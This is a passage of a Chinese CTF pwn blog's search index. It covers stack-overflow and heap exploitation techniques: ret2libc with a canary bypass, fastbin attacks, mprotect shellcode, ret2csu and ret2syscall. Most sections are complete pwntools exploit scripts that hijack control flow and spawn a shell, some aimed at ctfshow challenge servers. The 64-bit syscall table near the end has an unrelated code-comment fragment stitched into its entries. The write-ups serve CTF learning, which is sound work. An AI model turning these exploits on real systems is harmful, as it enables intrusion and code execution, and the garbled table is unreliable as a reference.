payload2+=p64(puts_plt)                                       #调用puts函数payload2+=p64(main_addr)                                      #最后返回到main，再次进行栈溢出  io.recvuntil(b&quot;Maybe UR closer to the key&quot;)                     io.sendline(payload2)puts_addr = u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #接收puts函数的真实地址，从7f开始接收，长度补足8个字节print(&quot;real addr:&quot;,hex(puts_addr))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)                           #查询libc版本base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址#payload3：构造调用system(&quot;/bin/sh&quot;)payload3=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8      payload3+=p64(ret_addr)                                       #栈平衡payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   #将/bin/sh的地址储存在rdi寄存器中payload3+=p64(system)io.sendline(payload3)io.interactive()\n\n最后题目为我们提供Libc版本.so文件, 与 不提供的区别（1）当题目不提供libc.so文件我们就需要借助LibcSearche库from LibcSearcher import *libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址\n\n(2)当题目提供libc.so文件libc=ELF(&#x27;libc-2.23.so&#x27;)base=puts_addr-libc.sym[&#x27;puts&#x27;]                              #计算基地址system=base+libc.sym[&#x27;system&#x27;]                               #计算system函数地址bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))           #计算/bin/sh字符串地址\n\n参考文章：canary：canary介绍与绕过技巧_金丝雀漏洞缓解-CSDN博客\n​\t      pwn入门之canary保护_pwn canary-CSDN博客\nret2libc:pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客\nexp:[【PWN · ret2libc | Canary】2021 鹤城杯]littleof-CSDN博客\n区别：CTF(Pwn) 当题目为我们提供Libc版本.so文件, 与 不提供的区别_ctf题中.so文件-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"fastbin attack","url":"/2025/11/18/fastbin-attack/","content":"\n1.Fastbin Double FreeDouble free及将一个堆块free两次，gdb中如下图所示\n\n这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改\nFastbin Double Free能够成功利用的原因：\n1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空\n2.fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证\n2.fastbin dump into stack顾名思义，将堆块申请在栈上，控制栈上的数据，利用uaf漏洞，将fd指针改为要控制数据的地址-0x10（因为fd指针指的是堆块的头部，所以需要-0x10，才刚好使数据段落在要要控制数据的栈上），修改堆块的内容就可以控制栈上的数据\n注：首先要伪造size位（0xn1）\nISMMAP位不能为1\ninues位为0\nsize位为0x40\n地址要64位：0&#x2F;8\n​          32位：0&#x2F;4  对齐\n在内存中构造了一个了一个堆块，还要怎么样才能让它   free\n扩展用在fastbin attack打mallco使申请堆块大小受限制（&lt;&#x3D;0x60,也就是没发使堆块的size位为0x71）\n在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，所以我们把top_chunk的地址改了，就能申请任意地址\n直接改top chunk的地址\n申请一个size位为0x31的堆块，free掉，修改fd指针为0x61，再将这个堆块申请出来，这样main_arena中存储大小为0x30的堆块的数组就会存上0x61（为了伪造size位）\n\n然后我们申请一个size位为0x61的堆块，free掉，修改指针到main_arena-80的地方这样，申请两次，将main_arena-80的堆块申请出来，因为main_arena-80与top chunk的地址紧挨着，所以可以写数据覆盖top chunk\n为什么要是main_arena-80看图\n\n这样可以伪造一个size位，堆块才能被申请在这里\n\n具体写多少自己数\nadd(0,0x20)add(1,0x20)free(0)edit(0,p64(0x61))add(2,0x20)add(3,0x50)free(3)edit(3,p64(0x7ffff7bc4b28))add(4,0x50)add(5,0x50)bug()payload = p64(8)*8+p64(0x7ffff7bc4aed)edit(5,payload)\n\n3.fastbin dup consolidate#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123;  void* p1 = malloc(0x40);  void* p2 = malloc(0x40);  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2);  fprintf(stderr, &quot;Now free p1!\\n&quot;);  free(p1);  void* p3 = malloc(0x400);  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3);  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;);  free(p1);  fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;);  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;);  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));&#125;\n\n申请两个堆块大小范围在fastbin，p2是为了防止触发malloc_consolidate 使得p1被合并进入top_chunk\nfree掉p1进入fastbin申请0x400的大小的chunk，这时触发malloc_consolidate，p1就会被放在unsortbin\n因为这时候p1已经不在fastbins了，可以再次free一次触发double free\n这时候申请两次\n第一次会把 fastbin 中的 p1 chunk 给 malloc 出来，然后 fastbin 为空\n第二次会把 unsorted 中的 p1 chunk 给 malloc 出来，所以会能 malloc 到两次一样的 chunk\n效果: 首先它会像unsortedbin（small）一样将相邻高地址的堆块inuse位置零同时也会被放进unsortedbin链表中(即存在fd和bk的使用), 其次它依旧满足fastbin的free堆块inuse位不置零, 那么如果存在有off by one或者其写入大小符合在不free时可以写入下一个chunk的pre_size, 那么就很容易触发到unlink了\n具体实现：\nmalloc_consolidate的功能就是把chunk从fastbin取出，相邻的chunk进行合并，并且会设置下一个chunk的prev_inuse位为0。当chunk从fastbin里取出后，我们就可以在再一次free这个chunk了，此时，fastbin里没有形成循环链表，一个chunk在fastbin，一个chunk在unosrted bin（small）。关键的一点是下一个chunk的prev_inuse已经清零，我们将fastbin里的那个chunk申请回来，伪造一个chunk（往fastbin中写，也就是写入了unsortbin中，将fd与bk设为对应的值就可以），然后释放下一个unsorted bin范围的chunk，就会发生unlink。\nadd(1,b&#x27;samll&#x27;)add(2,b&#x27;big&#x27;)free(1)add(3,b&#x27;large&#x27;)free(1)payload = p64(0)+p64(0x21)+p64(small_buf_addr - 0x18) + p64(small_buf_addr - 0x10)+p64(0x20)add(1,payload)free(2)\n\n触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护\n","categories":["堆"],"tags":["知识点"]},{"title":"fastbins","url":"/2025/11/17/fastbins/","content":"\nfast bins 的大小范围\n单个 fast bin 管理的块大小\n\n\n每个 fast bin 对应一种固定大小的内存块，块大小按 8 字节递增（32 位系统）或 16 字节递增（64 位系统）。\n\n64 位系统示例（常见场景）：\n\n最小块大小：0x20 字节（包含 16 字节的头部 0x10 + 对齐填充 0x10）。\n\n最大块大小：0x80 字节（即 fastbin_max_size = 0x80，超过此大小的块不属于 fast bins）。\n\n有效大小序列：0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80（共 7 个 fast bin）。\n\n32 位系统示例：\n\n最小块大小：0x10 字节（头部 0x8 + 对齐填充 0x8）。\n\n最大块大小：0x78 字节（fastbin_max_size = 0x78）。\n\n有效大小序列：0x10, 0x18, 0x20, …, 0x78（按 8 字节递增）。\n\n\n\n关键参数\n\n\nfastbin_max_size：定义 fast bins 能管理的最大块大小（64 位系统默认 0x80，32 位系统默认 0x78）。\n块大小计算：块大小需包含头部（prev_size 和 size 字段）和用户数据区，且需按 16 字节对齐（64 位）或 8 字节对齐（32 位）。\n\n问题 1：Fastbins 的 fd 指向谁？Fastbins 采用 LIFO（后进先出） 结构，后释放的堆块会放在链表头部，而 **fd** 指向的是先前被释放的堆块。\n示例：ptr1 = malloc(0x10);ptr2 = malloc(0x10);ptr3 = malloc(0x10);\n\n此时堆结构如下：\n[ ptr1 ]   [ ptr2 ]   [ ptr3 ]\n释放顺序：如果我们按照 free(ptr1) -&gt; free(ptr2) -&gt; free(ptr3) 释放堆块，则 Fastbins 的链表结构如下：\nFastbins 结构（LIFO，头部插入）：\n+---------+       +---------+       +---------+|  ptr3   |-----&gt; |  ptr2   |-----&gt; |  ptr1   |-----&gt; NULL+---------+       +---------+       +---------+  (最近释放)        (第二个释放)        (最早释放)\n\n对应的 fd 指针：\nptr3-&gt;fd = ptr2ptr2-&gt;fd = ptr1ptr1-&gt;fd = NULL\n\nFastbins 结构更新：\n+---------+       +---------+|  ptr2   |-----&gt; |  ptr1   |-----&gt; NULL+---------+       +---------+  (第二个释放)       (最早释放)\n\n再申请一个 malloc(0x10)，ptr2 会被分配：\n+---------+|  ptr1   |-----&gt; NULL+---------+  (最早释放)\n\n再申请一个 malloc(0x10)，ptr1 被分配，Fastbins 变为空。\n完整示意图释放过程：free(ptr1)   free(ptr2)   free(ptr3)   ↓            ↓            ↓+------+     +------+     +------+| ptr1 |     | ptr2 |     | ptr3 |+------+     +------+     +------+\n\nFastbins 变成：\nptr3 -&gt; ptr2 -&gt; ptr1 -&gt; NULL\n分配过程：如果 malloc(0x10)：\n分配 ptr3：ptr2 -&gt; ptr1 -&gt; NULL\n\n再 malloc(0x10)：\n分配 ptr2：ptr1 -&gt; NULL\n\n再 malloc(0x10)：\n分配 ptr1：NULL（Fastbins 为空）\n\n总结：\nFastbins 释放时，后释放的堆块会放在链表头部，而 **fd** 指向的是先前释放的堆块。\nFastbins 申请时，总是优先分配最近释放的堆块（LIFO 规则）\n\n","categories":["堆"],"tags":["知识点"]},{"title":"Hello World","url":"/2025/11/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"mprotect函数","url":"/2025/01/24/mprotect%E5%87%BD%E6%95%B0/","content":"一、mprotect() 函数（1）mprotect() 函数简介在二进制漏洞利用（Pwn）中，mprotect() 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 mprotect() 函数将该区域的权限修改为可执行。\n（2）mprotect() 函数的原型#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);\n\n参数说明：\n\n\n\naddr\nlen\nprot\n\n\n\n修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍\n修改权限的内存区域的长度，单位是字节\n指定新的内存访问权限\n\n\n内存访问权限：\n\n\n\nPROT_READ\nPROT_WRITE\nPROT_EXEC\nPROT_NONE\n\n\n\n允许读取该内存区域\n允许写入该内存区域\n允许执行该内存区域中的代码\n禁止对该内存区域进行任何访问\n\n\n注：一般prot直接修改为7，即可读可写可执行\n二、例题ctfshow49（1）思路我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以\n但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数\n我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”\n\npop_ebx_esi_ebp_ret &#x3D; 0x080a019b\n第一个参数：addr&#x3D;0x80d8000\n第二个参数：len&#x3D;0x1000\n第三个参数：port&#x3D;7\n同样read函数也需要设置三个参数\n在 C 语言里，read 函数的原型如下\n#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);\n\n参数解释：\nfd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）\nbuf：指向用于存储读取数据的缓冲区的指针\ncount：期望读取的最大字节数\n第一个参数：fd&#x3D;0\n第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）\n第三个参数：count&#x3D;0x1000\n（2）expfrom pwn import*elf=ELF(&#x27;./pwn&#x27;)context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28134)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_ebx_esi_ebp_ret = 0x080a019bshellcode = asm(shellcraft.sh())               #生成shellcodeaddr=0x80d8000buf=0x80d8000len=0x1000port=7payload = b&#x27;a&#x27;*(0x12+0x4)+p32(mprotect)           #将返回地址设为mprotectpayload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(len)+p32(port)   #设置mprotect的参数payload += p32(read)                              #将mprotect返回地址设为readpayload +=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(buf)+p32(len)               #设置read的参数payload +=p32(buf)                               #将read的返回地址设为buf（也就是shellcode）io.sendline(payload)io.sendline(shellcode)                            #将shellcode写入bssio.interactive()\n\n","categories":["第二周"],"tags":["wp"]},{"title":"ret2csu","url":"/2025/02/09/ret2csu/","content":"ret2csu的知识点（1）ret2csu的概念ret2csu是一种利用__libc_csu_init函数中的gadget进行ROP链构造的技术，主要用于控制寄存器参数，特别是当程序中缺少足够的gadgets时。这个函数在动态链接的程序中普遍存在，所以适用性较广。当我们做题时我们会发现有些gadget不存在这时我们就可以用ret2csu这种方法\n（2）__libc_csu_init函数__libc_csu_init有两部分我们把这两部分叫gadget2和gadget1\n\n下面这一部分gadget1\n.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716                 add     rsp, 8.text:000000000040071A                 pop     rbx.text:000000000040071B                 pop     rbp.text:000000000040071C                 pop     r12.text:000000000040071E                 pop     r13.text:0000000000400720                 pop     r14.text:0000000000400722                 pop     r15.text:0000000000400724                 retn\n\n可以看到是将数据弹入到rbx、rbp、r12、r13、r14、r15这六个寄存器中，这样我们就不用找gadget，更重要的是gadget2\n上面一部分是gadget2\n.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400700                 mov     rdx, r13.text:0000000000400703                 mov     rsi, r14.text:0000000000400706                 mov     edi, r15d.text:0000000000400709                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8].text:000000000040070D                 add     rbx, 1.text:0000000000400711                 cmp     rbx, rbp.text:0000000000400714                 jnz     short loc_400700\n\n可以看到是将r13寄存器的值赋值给rdx，r14赋值给rsi，r15赋值给rdi，然后调用函数，这里的rbx是索引寄存器**(设置为0，将r12设置为调用函数的got表地址）*，再往后rbx的值加1，比较rbx与rbp的值，如果rbx不等于 rbp，就跳转到loc_400700处，继续循环，为了避免继续循环我们将rbp的值设置为1，这样就可以跳出循环，继续往下执行也就是gadgets1，loc_400716处，如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（78）个垃圾数据即可\n注:\n1.如何不执行call\n如果我们仅仅利用__libc_csu_init函数去控制参数，而并不想去用call执行，我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数）_term_proc函数（call的是指向_term_proc的地址，不是term_proc的地址）\n2.如何控制rax的值？(修改rax进行系统调用)\n这里就非常巧妙了，可以利用write和read的返回值\n如果读取或写入成功就会将read函数和write函数实际读到和写入的字节数存入rax中，这样就达到了控制rax的值\n如果错误会返回-1，存入errno\n例题ida：\nssize_t x64_ret2libc()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  write(1, &quot;Welcome to x64_ret2csu\\n&quot;, 0x17uLL);  return read(0, buf, 300uLL);&#125;\n\nread可以栈溢出(0x80+0x8)\n思路：\n通过栈溢出到gadget1，设值write的参数，返回值设置为gadget2，调用write，打印出write的got表地址，接下来套用模板就可以\n\n\n\nrbx\nrbp\nr12\nr13(rdx)\nr14(rsi)\nr15(rdi)\n\n\n\n0\n1\nwrite_got\n8\nwrite_got\n1\n\n\ngadget1:0x400716\ngadget2:0x400700\nmain:0x040065b\npop_rdi :0x400723\nret = 0x4004c9\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./ret2csu&#x27;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p = process(&#x27;./ret2csu&#x27;)gadget1 = 0x400716gadget2 = 0x400700write_got = elf.got[&#x27;write&#x27;]main = 0x040065bpop_rdi = 0x400723ret = 0x4004c9rbx = 0rbp = 1r12 = write_gotr13 = 8r14 = write_gotr15 = 1payload = b&#x27;a&#x27;*(0x80+0x8) payload += p64(gadget1)payload += p64(ret)payload += p64(rbx)\tpayload += p64(rbp)\t\tpayload += p64(r12)payload += p64(r13)\t\t\tpayload += p64(r14)\tpayload += p64(r15)\t\t\tpayload += p64(gadget2)payload += p64(0)*7payload += p64(main)p.recvuntil(b&quot;Welcome to x64_ret2csu\\n&quot;)p.send(payload)write_addr = u64(p.recv(8))print(hex(write_addr))libc_base = write_addr - libc.sym[&#x27;write&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload = b&#x27;a&#x27;*(0x80+8) +p64(pop_rdi) + p64(bin_sh) + p64(system)p.sendlineafter(b&quot;Welcome to x64_ret2csu\\n&quot;,payload)p.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall例题","url":"/2025/02/08/ret2syscall%E4%BE%8B%E9%A2%98/","content":"ctfshow72（32位ret2syscall，多系统函数调用）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，开启NX保护，栈不可执行\nIDA:\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+10h] [ebp-20h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-PWN&quot;);  puts(&quot;where is my system?&quot;);  gets(&amp;v4);  puts(&quot;Emmm&quot;);  return 0;&#125;\n\n这道题与上一道题一样，只不过没有”&#x2F;bin&#x2F;sh”字符串，但是有read，我们可以调用read函数，往bss段写入&#x2F;bin&#x2F;sh\n0x08049421 : int 0x80\nread = 0x0806d170\n0x080bb2c6 : pop eax ; ret\n0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret\n0x0806F350: int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28220)pop_eax_ret = 0x080bb2c6pop_edx_ecx_ebx_ret = 0x0806ecb0int_0x80 = 0x0806F350bss =   0x080EBB29binsh = &quot;/bin/sh\\x00&quot;                         #以空字符 &#x27;\\x00&#x27;作为结束标志的，防止读取后续内存中的数据payload = b&#x27;a&#x27;*(44)+p32(pop_eax_ret)payload += p32(0x3)+p32(pop_edx_ecx_ebx_ret)  #0x3是read函数的系统调用号payload += p32(0x100)+p32(bss)+p32(0)         #read的三个参数payload += p32(int_0x80)payload += p32(pop_eax_ret)+p32(0xb)payload += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss)payload += p32(int_0x80)io.sendline(payload)io.sendline(binsh)io.interactive()\n\n同时因为是静态编译我们可以借助mprotect函数修改bss段的权限\nexp：\nfrom pwn import*elf = ELF(&#x27;./pwn&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28187)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_edx_ecx_ebx_ret = 0x0806ecb0bss =   0x080eb000shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(44)+p32(mprotect)           payload += p32(pop_edx_ecx_ebx_ret)+p32(bss)+p32(0x100)+p32(7)    #mprotect参数payload += p32(read) payload +=p32(bss)                            payload += p32(0)+p32(bss)+p32(0x100)                             #read参数                 io.sendline(payload)io.sendline(shellcode)                            io.interactive()\n\n\n\nctfshow78（64位ret2syscall，多系统函数调用）Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\n\n64位NX保护开启\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  char v4[80]; // [rsp+0h] [rbp-50h] BYREF  setvbuf(stdout, 0LL, 2LL, 0LL);  setvbuf(stdin, 0LL, 1LL, 0LL);  puts(&quot;CTFshowPWN!&quot;);  puts(&quot;where is my system_x64?&quot;);  gets(v4);  puts(&quot;fuck&quot;);  return 0;&#125;\n\ngets函数可以栈溢出（0x58）这道题与ctfshow72一样，没有bin&#x2F;sh字符串，需要借助read写入\n0x000000000046b9f8 : pop rax ; ret\n0x00000000004016c3 : pop rdi ; ret\n0x00000000004377f9 : pop rdx ; pop rsi ; ret\nsyscall = 0x45BAC5\nexp：\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)#io = process(&#x27;./pwn&#x27;)rax_ret = 0x046b9f8rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9syscall = 0x45BAC5bss = 0x06C1DE3  binsh = b&quot;/bin/sh\\x00&quot;payload = b&#x27;a&#x27;*(0x58)+p64(rax_ret)+p64(0x0)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(syscall)payload += p64(rax_ret)+p64(0x3b)payload += p64(rdi_ret)+p64(bss)payload += p64(rdx_rsi_ret)+p64(0)+p64(0)+p64(syscall)#gdb.attach(io)io.sendline(payload)io.send(binsh)io.interactive()\n\n这道题也可以借助mprotect来修改bss段权限\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28191)elf = ELF(&#x27;./pwn&#x27;)rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9bss = 0x6c1c40 read =elf.sym[&#x27;read&#x27;]mprotect =elf.sym[&#x27;mprotect&#x27;]shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(0x58)payload += p64(rdi_ret)+p64(0x6c1000)      payload += p64(rdx_rsi_ret)+p64(7)+p64(0x1000)+p64(mprotect)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x1000)+p64(bss)+p64(read)+p64(bss)io.sendline(payload)io.send(shellcode)io.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall知识点","url":"/2025/02/07/ret2syscall%E7%9F%A5%E8%AF%86%E7%82%B9/","content":"ret2syscall 原理当程序是静态编译时，我们可以通过强制程序执行一个系统调用（syscall）来获得shell\n（1）系统调用基础系统调用是操作系统提供给用户程序的一组接口，用于访问操作系统内核的功能。在 Linux 系统中，常见的系统调用包括文件操作（如 open、read、write）、进程管理（如 fork、execve）、内存管理（如 mmap）等。当用户程序需要执行特权操作时，会通过系统调用陷入内核态，由内核执行相应的操作，并将结果返回给用户程序。\n（2）系统调用过程1.设置系统调用号\n用户程序若要发起系统调用，首先要确定所需调用的系统调用对应的编号，并将其存放在 eax 寄存器中（32位）或rax寄存器中（64位）\n系统调用号是操作系统为每个系统调用分配的一个唯一的整数值标识符。用户程序在发起系统调用时，需要通过这个系统调用号来告知操作系统具体要执行哪一个系统调用，ret2syscall通常采用execve（在当前进程的上下文中执行一个新的程序），32位（0x0b）、64位（0x3b）\nLinux 32 位系统exit 1fork 2read 3write 4open 5close 6waitpid 7creat 8link 9unlink 10execve 11chdir 12time 13mknod 14chmod 15lchown 16break 17oldstat 18lseek 19getpid 20mount 21umount 22setuid 23getuid 24stime 25ptrace 26alarm 27oldfstat 28pause 29utime 30stty 31gtty 32access 33nice 34ftime 35sync 36kill 37rename 38mkdir 39rmdir 40dup 41pipe 42times 43prof 44brk 45setgid 46getgid 47signal 48geteuid 49getegid 50acct 51umount2 52lock 53ioctl 54fcntl 55mpx 56setpgid 57ulimit 58oldolduname 59umask 60chroot 61ustat 62dup2 63getppid 64getpgrp 65setsid 66sigaction 67sgetmask 68ssetmask 69setreuid 70setregid 71sigsuspend 72sigpending 73sethostname 74setrlimit 75getrlimit 76getrusage 77gettimeofday 78settimeofday 79getgroups 80setgroups 81select 82symlink 83oldlstat 84readlink 85uselib 86swapon 87reboot 88readdir 89mmap 90munmap 91truncate 92ftruncate 93fchmod 94fchown 95getpriority 96setpriority 97profil 98statfs 99fstatfs 100ioperm 101socketcall 102syslog 103setitimer 104getitimer 105stat 106lstat 107fstat 108olduname 109iopl 110vhangup 111idle 112vm86old 113wait4 114swapoff 115sysinfo 116ipc 117fsync 118sigreturn 119clone 120setdomainname 121uname 122modify_ldt 123adjtimex 124mprotect 125sigprocmask 126create_module 127init_module 128delete_module 129get_kernel_syms 130quotactl 131getpgid 132fchdir 133bdflush 134sysfs 135personality 136afs_syscall 137setfsuid 138setfsgid 139_llseek 140getdents 141_newselect 142flock 143msync 144readv 145writev 146getsid 147fdatasync 148_sysctl 149mlock 150munlock 151mlockall 152munlockall 153sched_setparam 154sched_getparam 155sched_setscheduler 156sched_getscheduler 157sched_yield 158sched_get_priority_max 159sched_get_priority_min 160sched_rr_get_interval 161nanosleep 162mremap 163setresuid 164getresuid 165vm86 166query_module 167poll 168nfsservctl 169setresgid 170getresgid 171prctl 172rt_sigreturn 173rt_sigaction 174rt_sigprocmask 175rt_sigpending 176rt_sigtimedwait 177rt_sigqueueinfo 178rt_sigsuspend 179pread64 180pwrite64 181chown 182getcwd 183capget 184capset 185sigaltstack 186sendfile 187getpmsg 188putpmsg 189vfork 190ugetrlimit 191mmap2 192truncate64 193ftruncate64 194stat64 195lstat64 196fstat64 197lchown32 198getuid32 199getgid32 200geteuid32 201getegid32 202setreuid32 203setregid32 204getgroups32 205setgroups32 206fchown32 207setresuid32 208getresuid32 209setresgid32 210getresgid32 211chown32 212setuid32 213setgid32 214setfsuid32 215setfsgid32 216pivot_root 217mincore 218madvise 219madvise1 219getdents64 220fcntl64 221gettid 224readahead 225setxattr 226lsetxattr 227fsetxattr 228getxattr 229lgetxattr 230fgetxattr 231listxattr 232llistxattr 233flistxattr 234removexattr 235lremovexattr 236fremovexattr 237tkill 238sendfile64 239futex 240sched_setaffinity 241sched_getaffinity 242set_thread_area 243get_thread_area 244io_setup 245io_destroy 246io_getevents 247io_submit 248io_cancel 249fadvise64 250exit_group 252lookup_dcookie 253epoll_create 254epoll_ctl 255epoll_wait 256remap_file_pages 257set_tid_address 258timer_create 259timer_settime 260timer_gettime 261timer_getoverrun 262timer_delete 263clock_settime 264clock_gettime 265clock_getres 266clock_nanosleep 267statfs64 268fstatfs64 269tgkill 270utimes 271fadvise64_64 272vserver 273mbind 274get_mempolicy 275set_mempolicy 276mq_open 277mq_unlink 278mq_timedsend 279mq_timedreceive 280mq_notify 281mq_getsetattr 282kexec_load 283waitid 284sys_setaltroot 285add_key 286request_key 287keyctl 288ioprio_set 289ioprio_get 290inotify_init 291inotify_add_watch 292inotify_rm_watch 293migrate_pages 294openat 295mkdirat 296mknodat 297fchownat 298futimesat 299fstatat64 300unlinkat 301renameat 302linkat 303symlinkat 304readlinkat 305fchmodat 306faccessat 307pselect6 308ppoll 309unshare 310set_robust_list 311get_robust_list 312splice 313sync_file_range 314tee 315vmsplice 316move_pages 317getcpu 318epoll_pwait 319utimensat 320signalfd 321timerfd_create 322eventfd 323fallocate 324timerfd_settime 325timerfd_gettime 326signalfd4 327eventfd2 328epoll_create1 329dup3 330pipe2 331inotify_init1 332preadv 333pwritev 334rt_tgsigqueueinfo 335perf_event_open 336recvmmsg 337fanotify_init 338 fanotify_mark 339 prlimit64 340 name_to_handle_at 341 open_by_handle_at 342 clock_adjtime 343 syncfs 344sendmmsg 345set_ns 346 process_vm_readv 347process_vm_writev 348\n\n\n\nLinux 64 位系统read 0write 1open 2close 3stat 4fstat 5lstat 6poll 7lseek 8mmap 9mprotect 10munmap 11brk 12rt_sigaction 13rt_sigprocmask 14rt_sigreturn 15ioctl 16pread64 17pwrite64 18readv 19writev 20access 21pipe 22select 23sched_yield 24mremap 25msync 26mincore 27madvise 28shmget 29shmat 30shmctl 31dup 32dup2 33pause 34nanosleep 35getitimer 36alarm 37setitimer 38getpid 39sendfile 40socket 41connect 42accept 43sendto 44recvfrom 45sendmsg 46recvmsg 47shutdown 48bind 49listen 50getsockname 51getpeername 52socketpair 53setsockopt 54getsockopt 55clone 56fork 57vfork 58execve 59exit 60wait4 61kill 62uname 63semget 64semop 65semctl 66shmdt 67msgget 68msgsnd 69msgrcv 70msgctl 71fcntl 72flock 73fsync 74fdatasync 75truncate 76ftruncate 77getdents 78getcwd 79chdir 80fchdir 81rename 82mkdir 83rmdir 84creat 85link 86unlink 87symlink 88readlink 89chmod 90fchmod 91chown 92fchown 93lchown 94umask 95gettimeofday 96getrlimit 97getrusage 98sysinfo 99times 100ptrace 101getuid 102syslog 103y end the stuff that never runs during the benchmarks */getgid 104setuid 105setgid 106geteuid 107getegid 108setpgid 109getppid 110getpgrp 111setsid 112setreuid 113setregid 114getgroups 115setgroups 116setresuid 117getresuid 118setresgid 119getresgid 120getpgid 121setfsuid 122setfsgid 123getsid 124capget 125capset 126rt_sigpending 127rt_sigtimedwait 128rt_sigqueueinfo 129rt_sigsuspend 130sigaltstack 131utime 132mknod 